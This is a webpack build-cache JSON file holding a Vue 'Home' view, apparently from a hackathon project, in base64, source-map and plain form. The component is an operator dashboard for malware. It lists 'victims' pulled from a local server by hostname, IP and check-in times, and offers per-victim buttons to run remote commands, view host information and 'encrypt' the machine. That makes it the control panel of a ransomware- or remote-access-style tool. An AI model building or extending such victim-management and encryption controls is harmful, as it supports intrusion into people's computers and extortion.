{"remainingRequest":"/home/mmarinse/Hackathon2/grupo-sudoers/node_modules/vue-loader/lib/index.js??vue-loader-options!/home/mmarinse/Hackathon2/grupo-sudoers/src/views/Home.vue?vue&type=script&lang=js&","dependencies":[{"path":"/home/mmarinse/Hackathon2/grupo-sudoers/src/views/Home.vue","mtime":1638089847804},{"path":"/home/mmarinse/Hackathon2/grupo-sudoers/node_modules/cache-loader/dist/cjs.js","mtime":499162500000},{"path":"/home/mmarinse/Hackathon2/grupo-sudoers/node_modules/babel-loader/lib/index.js","mtime":315532800000},{"path":"/home/mmarinse/Hackathon2/grupo-sudoers/node_modules/cache-loader/dist/cjs.js","mtime":499162500000},{"path":"/home/mmarinse/Hackathon2/grupo-sudoers/node_modules/vue-loader/lib/index.js","mtime":499162500000}],"contextDependencies":[],"result":[{"type":"Buffer","data":"base64:Ly8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KLy8KCmltcG9ydCBheGlvcyBmcm9tICJheGlvcyI7CmltcG9ydCBSZXF1ZXN0RGlhbG9nIGZyb20gIi4uL2NvbXBvbmVudHMvUmVxdWVzdERpYWxvZy52dWUiCgogIGV4cG9ydCBkZWZhdWx0IHsKICAgIG5hbWU6ICdIb21lJywKCiAgICBjb21wb25lbnRzOnsKICAgICAgUmVxdWVzdERpYWxvZwogICAgfSwKICAgIGRhdGEoKXsKICAgICAgcmV0dXJuIHsKICAgICAgICB0aXRsZToiIiwKICAgICAgICBsb2FkaW5nOnRydWUsCiAgICAgICAgdGV4dDoiIiwKICAgICAgICBkaWFsb2dUeXBlOiIiLAogICAgICAgIGlkOiBudWxsLAogICAgICAgIHJlcXVlc3REaWFsb2c6IGZhbHNlLAogICAgICAgIHRvZGF5OiBuZXcgRGF0ZSgpLAogICAgICAgIHZpY3RpbXM6W10sCiAgICAgICAgaGVhZGVyczpbCiAgICAgICAgICB7CiAgICAgICAgICAgIHRleHQ6ICIiLAogICAgICAgICAgICB2YWx1ZTogJ2xhc3RUaW1lJywKICAgICAgICAgICAgc29ydGFibGU6IHRydWUsCiAgICAgICAgICAgIGNsYXNzOiJoZWFkZXIiCiAgICAgICAgICB9LAogICAgICAgICAgewogICAgICAgICAgICB0ZXh0OiAiSE9TVE5BTUUiLAogICAgICAgICAgICB2YWx1ZTogJ2hvc3RuYW1lJywKICAgICAgICAgICAgc29ydGFibGU6IHRydWUKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIHRleHQ6ICJGSVJTVCBUSU1FIiwKICAgICAgICAgICAgdmFsdWU6ICdmaXJzdFRpbWUnLAogICAgICAgICAgICBzb3J0YWJsZTogZmFsc2UKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIHRleHQ6ICJJUCIsCiAgICAgICAgICAgIHZhbHVlOiAnaXAnLAogICAgICAgICAgICBzb3J0YWJsZTogZmFsc2UKICAgICAgICAgIH0sCiAgICAgICAgICB7CiAgICAgICAgICAgIHRleHQ6ICJPUFRJT05TIiwKICAgICAgICAgICAgdmFsdWU6ICdvcHRpb25zJywKICAgICAgICAgICAgc29ydGFibGU6IGZhbHNlCiAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICBsb2FkaW5nOnsKICAgICAgICAgIHR5cGU6IEJvb2xlYW4sCiAgICAgICAgICBkZWZhdWx0OiB0cnVlCiAgICAgICAgfQogICAgICB9CiAgICB9LAogICAgbWV0aG9kczp7CiAgICAgIGFzeW5jIG9idGFpblZpY3RpbXMoKXsKICAgICAgICB0aGlzLnZpY3RpbXM9W10KICAgICAgICB0aGlzLmRhdGVMZXNzRml2ZSgpCiAgICAgICAgdGhpcy5sb2FkaW5nID0gdHJ1ZQogICAgICAgIGxldCB1c2VycwogICAgICAgIGxldCBwYXJzZWRVc2VycyA9IFtdCiAgICAgICAgdHJ5ewogICAgICAgICAgICBsZXQgaG95ID0gdGhpcy50b2RheQogICAgICAgICAgICB1c2VycyA9IGF3YWl0IGF4aW9zLmdldCgiaHR0cDovLzE5Mi4xNjguODguMjE6MzA1MC9lcXVpcG9zIikKICAgICAgICAgICAgdXNlcnMuZGF0YS5mb3JFYWNoKHVzZXIgPT4gewogICAgICAgICAgICAgIGxldCBhw7FvID0gdXNlci51bHRpbWFfZmVjaGEuc3Vic3RyaW5nKDAsNCkKICAgICAgICAgICAgICBsZXQgbWVzID0gdXNlci51bHRpbWFfZmVjaGEuc3Vic3RyaW5nKDQsNikKICAgICAgICAgICAgICBsZXQgZGlhID0gdXNlci51bHRpbWFfZmVjaGEuc3Vic3RyaW5nKDYsOCkKICAgICAgICAgICAgICBsZXQgaG9yYSA9IHVzZXIudWx0aW1hX2ZlY2hhLnN1YnN0cmluZyg4LDEwKQogICAgICAgICAgICAgIGxldCBtaW4gPSB1c2VyLnVsdGltYV9mZWNoYS5zdWJzdHJpbmcoMTAsMTIpCiAgICAgICAgICAgICAgbGV0IHNlZyA9IHVzZXIudWx0aW1hX2ZlY2hhLnN1YnN0cmluZygxMiwxNCkKICAgICAgICAgICAgICBsZXQgbWlsaXNlZyA9IHVzZXIudWx0aW1hX2ZlY2hhLnN1YnN0cmluZygxNCwxNikKICAgICAgICAgICAgICBsZXQgYcOxb1BGID0gdXNlci5wcmltZXJhX2ZlY2hhLnN1YnN0cmluZygwLDQpCiAgICAgICAgICAgICAgbGV0IG1lc1BGID0gdXNlci5wcmltZXJhX2ZlY2hhLnN1YnN0cmluZyg0LDYpCiAgICAgICAgICAgICAgbGV0IGRpYVBGID0gdXNlci5wcmltZXJhX2ZlY2hhLnN1YnN0cmluZyg2LDgpCiAgICAgICAgICAgICAgbGV0IGhvcmFQRiA9IHVzZXIucHJpbWVyYV9mZWNoYS5zdWJzdHJpbmcoOCwxMCkKICAgICAgICAgICAgICBsZXQgbWluUEYgPSB1c2VyLnByaW1lcmFfZmVjaGEuc3Vic3RyaW5nKDEwLDEyKQogICAgICAgICAgICAgIGxldCBzZWdQRiA9IHVzZXIucHJpbWVyYV9mZWNoYS5zdWJzdHJpbmcoMTIsMTQpCiAgICAgICAgICAgICAgbGV0IG1pbGlzZWdQRiA9IHVzZXIucHJpbWVyYV9mZWNoYS5zdWJzdHJpbmcoMTQsMTYpCiAgICAgICAgICAgICAgdXNlci51bHRpbWFfZmVjaGEgPSBuZXcgRGF0ZShhw7FvLG1lcyAtIDEsZGlhLGhvcmEsbWluLHNlZyxtaWxpc2VnKQogICAgICAgICAgICAgIHVzZXIucHJpbWVyYV9mZWNoYSA9IG5ldyBEYXRlKGHDsW9QRixtZXNQRiAtIDEsZGlhUEYsaG9yYVBGLG1pblBGLHNlZ1BGLG1pbGlzZWdQRikKICAgICAgICAgICAgICBkZWJ1Z2dlcgogICAgICAgICAgICAgIHBhcnNlZFVzZXJzLnB1c2godXNlcikKICAgICAgICAgICAgfSkKICAgICAgICB9Y2F0Y2goZSl7CiAgICAgICAgICAgIGNvbnNvbGUubG9nKGUpCiAgICAgICAgfQogICAgICAgIHRoaXMubG9hZGluZyA9IGZhbHNlCiAgICAgICAgdGhpcy52aWN0aW1zID0gdXNlcnMuZGF0YQogICAgICAgIGRlYnVnZ2VyCiAgICAgIH0sCiAgICAgIGRhdGVMZXNzRml2ZSgpewogICAgICAgIGxldCB0b2RheSA9IG5ldyBEYXRlKCkKICAgICAgICBsZXQgZmVjaGEgPSBuZXcgRGF0ZSh0b2RheSkKICAgICAgICBmZWNoYS5zZXRNaW51dGVzKHRvZGF5LmdldE1pbnV0ZXMoKSAtIDUpCiAgICAgICAgdGhpcy50b2RheSA9IGZlY2hhCiAgICAgIH0sCiAgICAgIG9wZW5EaWFsb2codGl0bGUsdGV4dCxkaWFsb2dUeXBlLGlkKSB7CiAgICAgICAgdGhpcy50aXRsZSA9IHRpdGxlCiAgICAgICAgdGhpcy50ZXh0ID0gdGV4dAogICAgICAgIHRoaXMuZGlhbG9nVHlwZSA9IGRpYWxvZ1R5cGUKICAgICAgICB0aGlzLmlkID0gaWQKICAgICAgICB0aGlzLnJlcXVlc3REaWFsb2cgPSB0cnVlOwogICAgICB9LAogICAgICBjbG9zZURpYWxvZyh2YWx1ZSkgewogICAgICAgIHRoaXMucmVxdWVzdERpYWxvZyA9IHZhbHVlOwogICAgICB9CiAgICB9LAogICAgYXN5bmMgY3JlYXRlZCgpeyAgCiAgICAgIGF3YWl0IHRoaXMub2J0YWluVmljdGltcygpCiAgICB9CiAgfQo="},{"version":3,"sources":["Home.vue"],"names":[],"mappings":";;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;AAgDA;AACA;;AAEA;AACA;;AAEA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA","file":"Home.vue","sourceRoot":"src/views","sourcesContent":["<template>\n  <v-container class=\"my-10\">\n    <div class=\"pos-r\">\n      <v-icon\n    @click=\"this.obtainVictims\"\n    class=\"update-icon\"\n    large>\n      mdi-update\n    </v-icon>\n    <v-data-table\n    :headers=\"headers\"\n    :items=\"victims\"\n    :items-per-page=\"10\" \n    :loading=\"loading\"\n    >\n    <template v-slot:item=\"{ item }\">\n      <tr>\n      <td class=\"body-1\">\n        <div v-if=\"item.ultima_fecha > today\" class=\"pa-2 green-color rounded-circle d-inline-block\"></div>\n        <div v-else class=\"pa-2 red-color rounded-circle d-inline-block\"></div>\n      </td>\n      <td class=\"text-no-wrap\">\n        {{item.nombre}}\n      </td>\n      <td class=\"text-no-wrap\">\n        <p v-if=\"item.primera_fecha\">\n        {{item.primera_fecha}}\n        </p>\n      </td>\n      <td class=\"text-no-wrap\">\n        {{item.ip}}\n      </td>\n      <td class=\"text-no-wrap\">\n        <v-icon @click=\"openDialog('Ejecutar comando remoto','Escoge un comando a ejecutar en la máquina víctima. Se ejecutará cuando la máquina se pueda conectar al servidor.','remoteCommand', item.id)\">mdi-antenna</v-icon>\n        <v-icon @click=\"openDialog('Información detallada','Información obtenida del host:','showInfo',item.id)\" class=\"mx-3\">mdi-eye</v-icon>\n        <v-icon @click=\"openDialog('Encryptar equipo','¿Quieres encriptar el equipo?','encrypt',item.id)\">mdi-lock</v-icon>\n      </td>\n      </tr>\n    </template>\n  </v-data-table>\n    </div>\n    \n  <request-dialog :id=\"id\" :text=\"text\" :title=\"title\" :dialogType=\"dialogType\" :dialog=\"requestDialog\" @dialog-closed=\"closeDialog\"/>\n  </v-container>\n\n</template>\n\n<script>\nimport axios from \"axios\";\nimport RequestDialog from \"../components/RequestDialog.vue\"\n\n  export default {\n    name: 'Home',\n\n    components:{\n      RequestDialog\n    },\n    data(){\n      return {\n        title:\"\",\n        loading:true,\n        text:\"\",\n        dialogType:\"\",\n        id: null,\n        requestDialog: false,\n        today: new Date(),\n        victims:[],\n        headers:[\n          {\n            text: \"\",\n            value: 'lastTime',\n            sortable: true,\n            class:\"header\"\n          },\n          {\n            text: \"HOSTNAME\",\n            value: 'hostname',\n            sortable: true\n          },\n          {\n            text: \"FIRST TIME\",\n            value: 'firstTime',\n            sortable: false\n          },\n          {\n            text: \"IP\",\n            value: 'ip',\n            sortable: false\n          },\n          {\n            text: \"OPTIONS\",\n            value: 'options',\n            sortable: false\n          }\n        ],\n        loading:{\n          type: Boolean,\n          default: true\n        }\n      }\n    },\n    methods:{\n      async obtainVictims(){\n        this.victims=[]\n        this.dateLessFive()\n        this.loading = true\n        let users\n        let parsedUsers = []\n        try{\n            let hoy = this.today\n            users = await axios.get(\"http://192.168.88.21:3050/equipos\")\n            users.data.forEach(user => {\n              let año = user.ultima_fecha.substring(0,4)\n              let mes = user.ultima_fecha.substring(4,6)\n              let dia = user.ultima_fecha.substring(6,8)\n              let hora = user.ultima_fecha.substring(8,10)\n              let min = user.ultima_fecha.substring(10,12)\n              let seg = user.ultima_fecha.substring(12,14)\n              let miliseg = user.ultima_fecha.substring(14,16)\n              let añoPF = user.primera_fecha.substring(0,4)\n              let mesPF = user.primera_fecha.substring(4,6)\n              let diaPF = user.primera_fecha.substring(6,8)\n              let horaPF = user.primera_fecha.substring(8,10)\n              let minPF = user.primera_fecha.substring(10,12)\n              let segPF = user.primera_fecha.substring(12,14)\n              let milisegPF = user.primera_fecha.substring(14,16)\n              user.ultima_fecha = new Date(año,mes - 1,dia,hora,min,seg,miliseg)\n              user.primera_fecha = new Date(añoPF,mesPF - 1,diaPF,horaPF,minPF,segPF,milisegPF)\n              debugger\n              parsedUsers.push(user)\n            })\n        }catch(e){\n            console.log(e)\n        }\n        this.loading = false\n        this.victims = users.data\n        debugger\n      },\n      dateLessFive(){\n        let today = new Date()\n        let fecha = new Date(today)\n        fecha.setMinutes(today.getMinutes() - 5)\n        this.today = fecha\n      },\n      openDialog(title,text,dialogType,id) {\n        this.title = title\n        this.text = text\n        this.dialogType = dialogType\n        this.id = id\n        this.requestDialog = true;\n      },\n      closeDialog(value) {\n        this.requestDialog = value;\n      }\n    },\n    async created(){  \n      await this.obtainVictims()\n    }\n  }\n</script>\n<style>\n.blue-color{\n  color:#004290;\n}\n.dark-blue-color{\n  color: #002E65;\n}\n.headers{\n  border-bottom: 2px solid #002E65;\n}\n.brd-row{\n  border-bottom: 1px solid #002E65;\n}\n.green-color{\n  background-color: green;\n}\n.red-color{\n  background-color: red;\n}\n.bold{\n  font-weight: bold;\n}\n.v-data-table-header span{\n  font-size: 18px;\n}\n.update-icon{\n  position: absolute !important;\n  right: 10px;\n}\n.pos-r{\n  position: relative;\n}\n</style>"]}]}